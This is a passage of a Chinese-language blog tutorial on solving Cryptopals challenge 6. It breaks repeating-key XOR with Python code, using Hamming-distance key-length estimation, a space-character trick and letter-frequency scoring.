href="#攻击细节" class="headerlink" title="攻击细节"></a>攻击细节</h1><p>整个的攻击流程其实可以分为两个步骤：密钥长度猜解，其次是解出明文。接下来就对这两个部分进行是的剖析。</p><h2 id="首先猜测密钥长度"><a href="#首先猜测密钥长度" class="headerlink" title="首先猜测密钥长度"></a>首先猜测密钥长度</h2><p>密钥长度的猜解其实比较直观的是进行暴力破解，在密钥长度比较短的时候比较凑效，但是随着密钥长度的增加，我们会发现暴力的方式会让效率相当的低下。甚至是根本解不出。但是在这两周的编程作业中，涉及到的密钥长度还是比较短的，不超过40位。暴力猜解的方法在思维上并没有什么难度，然后根据一番搜索，得知有这么一种利用<code>The Hamming distance</code>（汉明距离）来猜解密钥长度的方法。以下将对其进行进一步的阐述：</p><p>首先解释一下什么是汉明距离？汉明距离其实是在二进制层面观测两个等长字符串的比特位差异。可以看以下几个例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hamming(&quot;1010&quot;, &quot;1111&quot;) == 2</span><br><span class="line">hamming(&quot;1111&quot;, &quot;0000&quot;) == 4</span><br><span class="line">hamming(&quot;1111&quot;, &quot;1111&quot;) == 0</span><br></pre></td></tr></table></figure></p><p>可以看到，<code>1010</code>与<code>1111</code>有两个比特位存在差异，所以汉明距离为2。有一种快速的求解汉明距离的方法就是将等长字符串的方法，那就是异或。将两个二进制的字符异或后计算值为1的比特位个数，就是最后的汉明距离。具体的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def bxor(a, b):     # xor two byte strings of different lengths</span><br><span class="line">    if len(a) &gt; len(b):</span><br><span class="line">        return bytes([x ^ y for x, y in zip(a[:len(b)], b)])</span><br><span class="line">    else:</span><br><span class="line">        return bytes([x ^ y for x, y in zip(a, b[:len(a)])])</span><br><span class="line"></span><br><span class="line">def hamming_distance(b1, b2):</span><br><span class="line">    differing_bits = 0</span><br><span class="line">    for byte in bxor(b1, b2):</span><br><span class="line">        differing_bits += bin(byte).count(&quot;1&quot;)</span><br><span class="line">    return differing_bits</span><br></pre></td></tr></table></figure><p>知道了汉明距离和汉明距离代码实现后，我们应该思考，汉明距离和密钥长度的猜解有什么联系？通过阅读题干和相关拓展资料，我们知道，两个以ascii编码的英文字符的汉明距离是2-3之间，也就是说正常英文字母的平均汉明距离为2-3（每比特），任意字符（非纯字母）的两两汉明距离平均为4。另外我们也容易知道，正确分组的密文与密文的汉明距离等于明文与明文的汉明距离（可以通过按正确密钥长度分组的密文与密文异或等于明文与明文异或证明）。这样，我们可以知道，当我们使用了正确的密钥长度后，两两字母进行计算汉明距离，那么这个值应该是趋于最小。为了增加效率，我们不需要对每一对分组都计算汉明距离，只需取出前几对就可说明问题。当然为了排除偶然误差，结果不应该只取最小的那一个密钥长度，而是酌情多取几组。以下是<code>crypto chanllege set1 question6</code>这道题的密钥长度猜解代码示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def bxor(a, b):     # xor two byte strings of different lengths</span><br><span class="line">    if len(a) &gt; len(b):</span><br><span class="line">        return bytes([x ^ y for x, y in zip(a[:len(b)], b)])</span><br><span class="line">    else:</span><br><span class="line">        return bytes([x ^ y for x, y in zip(a, b[:len(a)])])</span><br><span class="line"></span><br><span class="line">def hamming_distance(b1, b2):</span><br><span class="line">    differing_bits = 0</span><br><span class="line">    for byte in bxor(b1, b2):</span><br><span class="line">        differing_bits += bin(byte).count(&quot;1&quot;)</span><br><span class="line">    return differing_bits</span><br><span class="line"></span><br><span class="line">text = &apos;&apos;</span><br><span class="line">with open(&quot;6.txt&quot;,&quot;r&quot;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        text += line</span><br><span class="line">b = base64.b64decode(text)</span><br><span class="line"></span><br><span class="line">normalized_distances = []</span><br><span class="line"></span><br><span class="line">for KEYSIZE in range(2, 40):</span><br><span class="line">    #我们取其中前6段计算平局汉明距离</span><br><span class="line">    b1 = b[: KEYSIZE]</span><br><span class="line">    b2 = b[KEYSIZE: KEYSIZE * 2]</span><br><span class="line">    b3 = b[KEYSIZE * 2: KEYSIZE * 3]</span><br><span class="line">    b4 = b[KEYSIZE * 3: KEYSIZE * 4]</span><br><span class="line">    b5 = b[KEYSIZE * 4: KEYSIZE * 5]</span><br><span class="line">    b6 = b[KEYSIZE * 5: KEYSIZE * 6]</span><br><span class="line"></span><br><span class="line">    normalized_distance = float(</span><br><span class="line">        hamming_distance(b1, b2) +</span><br><span class="line">        hamming_distance(b2, b3) +</span><br><span class="line">        hamming_distance(b3, b4) +</span><br><span class="line">        hamming_distance(b4, b5) + </span><br><span class="line">        hamming_distance(b5, b6) </span><br><span class="line">    ) / (KEYSIZE * 5)</span><br><span class="line"></span><br><span class="line">    normalized_distances.append(</span><br><span class="line">        (KEYSIZE, normalized_distance)</span><br><span class="line">    )</span><br><span class="line">normalized_distances = sorted(normalized_distances,key=lambda x:x[1])</span><br><span class="line"></span><br><span class="line">print(normalized_distances)</span><br><span class="line"></span><br><span class="line">#以下是运行结果：</span><br><span class="line">[(5, 2.96), (2, 3.0), (3, 3.3333333333333335), (29, 3.413793103448276), (31, 3.5935483870967744), (16, 3.7), (18, 3.7111111111111112), (14, 3.742857142857143), (15, 3.7466666666666666), (13, 3.753846153846154), (6, 3.7666666666666666), (19, 3.768421052631579), (8, 3.8), (20, 3.82), (37, 3.827027027027027), (39, 3.8666666666666667), (11, 3.8727272727272726), (33, 3.8727272727272726), (26, 3.8923076923076922), (12, 3.9), (17, 3.9176470588235293), (30, 3.92), (34, 3.9352941176470586), (22, 3.9454545454545453), (28, 3.95), (32, 3.95), (7, 3.9714285714285715), (27, 3.977777777777778), (21, 3.9904761904761905), (35, 3.994285714285714), (38, 4.021052631578947), (25, 4.024), (24, 4.033333333333333), (9, 4.044444444444444), (23, 4.069565217391304), (10, 4.1), (36, 4.188888888888889), (4, 4.2)]</span><br><span class="line">[Finished in 0.1s]</span><br></pre></td></tr></table></figure><p>可以看到，正确的密钥长度29排得比较靠前。这样我们从前往后取作为密钥长度来进行后面的密钥的猜解就可以大大增加我们的效率，相对于暴力遍历来说。这点在后面可以进一步看到。</p><h2 id="根据猜出的密钥长度进行密文的解密"><a href="#根据猜出的密钥长度进行密文的解密" class="headerlink" title="根据猜出的密钥长度进行密文的解密"></a>根据猜出的密钥长度进行密文的解密</h2><p>在密文的解密部分，根据笔者的总结，发现有两种行之有效的办法。</p><h3 id="methon-one（合理利用明文的空格）"><a href="#methon-one（合理利用明文的空格）" class="headerlink" title="methon one（合理利用明文的空格）:"></a>methon one（合理利用明文的空格）:</h3><p>这种方法其实是利用了一个抑或的规律和一个小技巧。使用到的抑或定律其实相当的简单：在使用异或加密的形式下，使用相同密钥加密的明文和秘文间存在这个规律，密文和密文异或等于明文和明文异或。可以通过简单的数学公式加以证明，这里就不展开叙述。另一个小技巧就是：空格和所有小写字母异或结果是相应的大写字母，空格和所有大写字母异或是相应的小写字母。为了证明这个小技巧，可以使用一个python脚本来遍历输出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">results = []</span><br><span class="line">value = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;</span><br><span class="line">for asc1 in value:</span><br><span class="line">print(asc1,&quot;^0x20----&gt;&quot;,chr(ord(asc1)^0x20))</span><br></pre></td></tr></table></figure><p>这样当两个密文按照字节异或后的结果处于字母表的ascii值之间，我们就可以有很大的概率认为异或的明文字符之一是空格，那么根据这个规律，我们可以依次遍历出密钥的每个字节，当捕获的密文组足够多，我们就可以有相当大的概率解出整个密钥，因为当密文组够多，我们有很大的概率得到每个密钥对应异或的字节位上的明文为空格，然后依次异或出密钥。</p><p>当然读者可能会问，ascii码那么多，两两异或的结果处于字母区间的可能情况不是有很多种吗？这样说是一点没错的，我曾经尝试写过一个常用英文符号两两异或的脚本，遍历输出非空格下，两者异或的结果是字母表区间的python脚本，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">results = []</span><br><span class="line">verifycode = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;</span><br><span class="line">value = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\,\/\.\&quot;\&apos;\?\!\ \:&apos;</span><br><span class="line"></span><br><span class="line">for asc1 in value:</span><br><span class="line">    for asc2 in value:</span><br><span class="line">        result = ord(asc1) ^ ord(asc2)</span><br><span class="line">        if chr(result) in verifycode and asc1 != &apos; &apos; and asc2 != &apos; &apos;:</span><br><span class="line">            results.append((asc1, asc2))</span><br><span class="line"></span><br><span class="line">filtedresult = []</span><br><span class="line">setresult = set(results)</span><br><span class="line">for i in setresult:</span><br><span class="line">    for j in setresult:</span><br><span class="line">        if set(i) != set(j) and set(i) not in filtedresult:</span><br><span class="line">            filtedresult.append(set(i))</span><br><span class="line"></span><br><span class="line">print(&quot;verify len:&quot;, len(filtedresult))</span><br><span class="line">print(&quot;result:&quot;, filtedresult)</span><br></pre></td></tr></table></figure></p><p>运行这个脚本，会发现有349种可能的情况，那么是不是说明运用空格这个点来破解不合理？其实不然，要知道，这349中可能性里面，没有哪一个字符可以满足与任何一个字母异或都是字母区间，这就是说，空格及有无可挑剔的最大可能。这样一来，我们可以分别按照密钥将密文重新分组，将异或用一个密钥字节的密文合并成一组，这样一来我们就可以拥有密钥长度个组，每个组都是明文异或同一个密钥字节得来的密文。取其中一个分组，将里面的字符两两异或，记录每个字符与其他每一个字符异或出现结果是字母的次数，取最大次数（因为根据概率学，明文空格情况下，该次数应该是最大的，当然不排除极小概率的特俗情况）的字符我们将推断其明文为空格，然后异或出该分组的密钥字节。说来可能有点绕，做出相应的图示如下：</p><p><img src="/myimages/流密码攻击/图例.jpg" alt="image"></p><p><img src="/myimages/流密码攻击/图例2.jpg" alt="image"></p><p>以下是具体的实现的步骤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 使用取模运算把密文分成n个分组（其中n是密钥长度），如此以来，我们就有了n个独立的凯撒加密式的密文组（因为每个分组里面的值是使用同一个密钥字节明文异或）。这样就把问题简化成了破解n个独立的凯撒加密模式的单字节抑或密码方式。这一步可以直接使用爆破，但是效率不高。我们采取另一种姿势。</span><br><span class="line">2. 将2中的每个分组做如下的操作：每个分组做嵌套循环，内循环，外循环。设置外循环计数值possible_space=0，max_possible=0，设置内循环计数值maxpossible=0,依次取出每个分组中的每一个字节做与其他字节两两抑或进行内循环，如果结果是字母，我们就把内循环计数值maxpossible+1,在每个内循环结束后进行max_possible的更新（与内循环maxpossible做对比），并记录当前字节的位置到possible_space，然后外循环继续。直至遍历完所有的字节。取出max_possible对应的字节位置possible_space处的字节码，我们把它对应的明文假设成空格（根据之前的讨论）然后将该位置的字节和0x20（空格）异或;找出相应位置的密钥字节。</span><br><span class="line">3. 重复2中的步骤，依次根据每个分组找出每位的密钥字节，至此密钥破解完毕</span><br><span class="line">4. 将找出的密钥用于破解密文。当密文足够多，可以发现破解的准确率很高，基本可以做到无差别破解。</span><br></pre></td></tr></table></figure></p><p>可能读者对上述步骤仍旧存在一些疑问，这里以例题作为进一步的说明（crypto chanllege set1 question6），下面是解题代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">def break_single_key_xor(text):</span><br><span class="line">    key = 0</span><br><span class="line">    possible_space=0</span><br><span class="line">    max_possible=0</span><br><span class="line">    letters = string.ascii_letters.encode(&apos;ascii&apos;)</span><br><span class="line">    for a in range(0, len(text)):</span><br><span class="line">        maxpossible = 0</span><br><span class="line">        for b in range(0, len(text)):</span><br><span class="line">            if(a == b):</span><br><span class="line">                continue</span><br><span class="line">            c = text[a] ^ text[b]</span><br><span class="line">            if c not in letters and c != 0:</span><br><span class="line">                continue</span><br><span class="line">            maxpossible += 1</span><br><span class="line">        if maxpossible&gt;max_possible:</span><br><span class="line">            max_possible=maxpossible</span><br><span class="line">            possible_space=a</span><br><span class="line">    key = text[possible_space]^ 0x20</span><br><span class="line">    return chr(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text = &apos;&apos;</span><br><span class="line">with open(&quot;6.txt&quot;,&quot;r&quot;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        text += line</span><br><span class="line">        </span><br><span class="line">b = base64.b64decode(text)</span><br><span class="line"></span><br><span class="line">for KEYSIZE in range(2, 40):</span><br><span class="line">    # KEYSIZE=29</span><br><span class="line">    block_bytes = [[] for _ in range(KEYSIZE)]</span><br><span class="line">    for i, byte in enumerate(b):</span><br><span class="line">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class="line">    keys = &apos;&apos;</span><br><span class="line">    try:</span><br><span class="line">        for bbytes in block_bytes:</span><br><span class="line">            keys += break_single_key_xor(bbytes)</span><br><span class="line">        key = bytearray(keys * len(b), &quot;utf-8&quot;)</span><br><span class="line">        plaintext = bxor(b, key)</span><br><span class="line">        print(&quot;keysize:&quot;, KEYSIZE)</span><br><span class="line">        print(&quot;key is:&quot;, keys, &quot;\n&quot;)</span><br><span class="line">        s = bytes.decode(plaintext)</span><br><span class="line">        print(s)</span><br><span class="line">    except Exception:</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure><p>在之前的讲述上，理解这段代码并不难，读者试着输出所有可能的结果，我们可以看到有40种不同的结果，当密钥长度爆破到29的时候，明文清晰可见。但是这里是采用爆破的方式猜解密钥长度，不是很智能。当我们使用之前汉明距离猜解密钥长度的方法，可以更加快速的得出结果，以下是改进版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def bxor(a, b):     # xor two byte strings of different lengths</span><br><span class="line">    if len(a) &gt; len(b):</span><br><span class="line">        return bytes([x ^ y for x, y in zip(a[:len(b)], b)])</span><br><span class="line">    else:</span><br><span class="line">        return bytes([x ^ y for x, y in zip(a, b[:len(a)])])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def hamming_distance(b1, b2):</span><br><span class="line">    differing_bits = 0</span><br><span class="line">    for byte in bxor(b1, b2):</span><br><span class="line">        differing_bits += bin(byte).count(&quot;1&quot;)</span><br><span class="line">    return differing_bits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def break_single_key_xor(text):</span><br><span class="line">    key = 0</span><br><span class="line">    possible_space=0</span><br><span class="line">    max_possible=0</span><br><span class="line">    letters = string.ascii_letters.encode(&apos;ascii&apos;)</span><br><span class="line">    for a in range(0, len(text)):</span><br><span class="line">        maxpossible = 0</span><br><span class="line">        for b in range(0, len(text)):</span><br><span class="line">            if(a == b):</span><br><span class="line">                continue</span><br><span class="line">            c = text[a] ^ text[b]</span><br><span class="line">            if c not in letters and c != 0:</span><br><span class="line">                continue</span><br><span class="line">            maxpossible += 1</span><br><span class="line">        if maxpossible&gt;max_possible:</span><br><span class="line">            max_possible=maxpossible</span><br><span class="line">            possible_space=a</span><br><span class="line">    key = text[possible_space]^ 0x20</span><br><span class="line">    return chr(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text = &apos;&apos;</span><br><span class="line">with open(&quot;6.txt&quot;,&quot;r&quot;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        text += line</span><br><span class="line">b = base64.b64decode(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">normalized_distances = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for KEYSIZE in range(2, 40):</span><br><span class="line">    #我们取其中前6段计算平局汉明距离</span><br><span class="line">    b1 = b[: KEYSIZE]</span><br><span class="line">    b2 = b[KEYSIZE: KEYSIZE * 2]</span><br><span class="line">    b3 = b[KEYSIZE * 2: KEYSIZE * 3]</span><br><span class="line">    b4 = b[KEYSIZE * 3: KEYSIZE * 4]</span><br><span class="line">    b5 = b[KEYSIZE * 4: KEYSIZE * 5]</span><br><span class="line">    b6 = b[KEYSIZE * 5: KEYSIZE * 6]</span><br><span class="line"></span><br><span class="line">    normalized_distance = float(</span><br><span class="line">        hamming_distance(b1, b2) +</span><br><span class="line">        hamming_distance(b2, b3) +</span><br><span class="line">        hamming_distance(b3, b4) +</span><br><span class="line">        hamming_distance(b4, b5) + </span><br><span class="line">        hamming_distance(b5, b6) </span><br><span class="line">    ) / (KEYSIZE * 5)</span><br><span class="line">    normalized_distances.append(</span><br><span class="line">        (KEYSIZE, normalized_distance)</span><br><span class="line">    )</span><br><span class="line">normalized_distances = sorted(normalized_distances,key=lambda x:x[1])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for KEYSIZE,_ in normalized_distances[:5]:</span><br><span class="line">    block_bytes = [[] for _ in range(KEYSIZE)]</span><br><span class="line">    for i, byte in enumerate(b):</span><br><span class="line">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class="line">    keys = &apos;&apos;</span><br><span class="line">    try:</span><br><span class="line">        for bbytes in block_bytes:</span><br><span class="line">            keys += break_single_key_xor(bbytes)</span><br><span class="line">        key = bytearray(keys * len(b), &quot;utf-8&quot;)</span><br><span class="line">        plaintext = bxor(b, key)</span><br><span class="line">        print(&quot;keysize:&quot;, KEYSIZE)</span><br><span class="line">        print(&quot;key is:&quot;, keys, &quot;\n&quot;)</span><br><span class="line">        s = bytes.decode(plaintext)</span><br><span class="line">        print(s)</span><br><span class="line">    except Exception:</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure><p>改进后我们可以更加快速的破解出明文，而且最后的人工搜索阶段也会减少很多的对比，十分友好。</p><h3 id="methon-two"><a href="#methon-two" class="headerlink" title="methon two:"></a>methon two:</h3><p>当然除了利用空格来猜测密钥这种方法以外，我们还有另外一种比较大众化的思路，那就是是利用了字母出现的平频率统计规律进行权重赋值。其实说白了就是字频攻击。在methon one中的第一部以后，我们就有了一组组类似凯撒加密的密文，只不过他们组不成完整的词或句子，如果我们单单暴力遍历256种密钥可能，那么结果我们也缺少一个衡量的指标，别说256中可能够你看的，而且没有一种是成词成句的。所以这样解出密钥很费力。我们需要一个评判的指标实现高可用和高效性。这时词频攻击的优势就体现出来了。我们可以给英文中的字母根据百分比附一个权重，然后依次计算256组解密后的“明文”总权重，当总权值最高时，我们有理由相信这时的密钥字节是正确的。因为当截获的密文足够多，我们可以得到分布十分贴近字频规律的明文，这样算出来的总权值就越大。关于字频的统计特性，我们可以在网上搜到很多权重赋值版本。以下是对<code>the cryptopals crypto challenges question6</code>的样例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def bxor(a, b):     # xor two byte strings of different lengths</span><br><span class="line">    if len(a) &gt; len(b):</span><br><span class="line">        return bytes([x ^ y for x, y in zip(a[:len(b)], b)])</span><br><span class="line">    else:</span><br><span class="line">        return bytes([x ^ y for x, y in zip(a, b[:len(a)])])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def hamming_distance(b1, b2):</span><br><span class="line">    differing_bits = 0</span><br><span class="line">    for byte in bxor(b1, b2):</span><br><span class="line">        differing_bits += bin(byte).count(&quot;1&quot;)</span><br><span class="line">    return differing_bits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def score(s):</span><br><span class="line">    freq = &#123;&#125;</span><br><span class="line">    freq[&apos; &apos;] = 700000000</span><br><span class="line">    freq[&apos;e&apos;] = 390395169</span><br><span class="line">    freq[&apos;t&apos;] = 282039486</span><br><span class="line">    freq[&apos;a&apos;] = 248362256</span><br><span class="line">    freq[&apos;o&apos;] = 235661502</span><br><span class="line">    freq[&apos;i&apos;] = 214822972</span><br><span class="line">    freq[&apos;n&apos;] = 214319386</span><br><span class="line">    freq[&apos;s&apos;] = 196844692</span><br><span class="line">    freq[&apos;h&apos;] = 193607737</span><br><span class="line">    freq[&apos;r&apos;] = 184990759</span><br><span class="line">    freq[&apos;d&apos;] = 134044565</span><br><span class="line">    freq[&apos;l&apos;] = 125951672</span><br><span class="line">    freq[&apos;u&apos;] = 88219598</span><br><span class="line">    freq[&apos;c&apos;] = 79962026</span><br><span class="line">    freq[&apos;m&apos;] = 79502870</span><br><span class="line">    freq[&apos;f&apos;] = 72967175</span><br><span class="line">    freq[&apos;w&apos;] = 69069021</span><br><span class="line">    freq[&apos;g&apos;] = 61549736</span><br><span class="line">    freq[&apos;y&apos;] = 59010696</span><br><span class="line">    freq[&apos;p&apos;] = 55746578</span><br><span class="line">    freq[&apos;b&apos;] = 47673928</span><br><span class="line">    freq[&apos;v&apos;] = 30476191</span><br><span class="line">    freq[&apos;k&apos;] = 22969448</span><br><span class="line">    freq[&apos;x&apos;] = 5574077</span><br><span class="line">    freq[&apos;j&apos;] = 4507165</span><br><span class="line">    freq[&apos;q&apos;] = 3649838</span><br><span class="line">    freq[&apos;z&apos;] = 2456495</span><br><span class="line">    score = 0</span><br><span class="line">    string=bytes.decode(s)</span><br><span class="line">    for c in string.lower():</span><br><span class="line">        if c in freq:</span><br><span class="line">            score += freq[c]</span><br><span class="line">    return score</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def break_single_key_xor(b1):</span><br><span class="line">max_score = 0</span><br><span class="line">english_plaintext = 0</span><br><span class="line">key = 0</span><br><span class="line"></span><br><span class="line">for i in range(0,256):</span><br><span class="line">b2 = [i] * len(b1)</span><br><span class="line">try:</span><br><span class="line">plaintext = bxor(b1, b2)</span><br><span class="line">pscore = score(plaintext)</span><br><span class="line">except Exception:</span><br><span class="line">continue</span><br><span class="line">if pscore &gt; max_score or not max_score:</span><br><span class="line">max_score = pscore</span><br><span class="line">english_plaintext = plaintext</span><br><span class="line">key = chr(i)</span><br><span class="line">return key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text = &apos;&apos;</span><br><span class="line">with open(r&quot;c:/Users/lyy18291855970/Desktop/密码学/密码题/the cryptopals crypto challenges/6.txt&quot;, &quot;r&quot;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        text += line</span><br><span 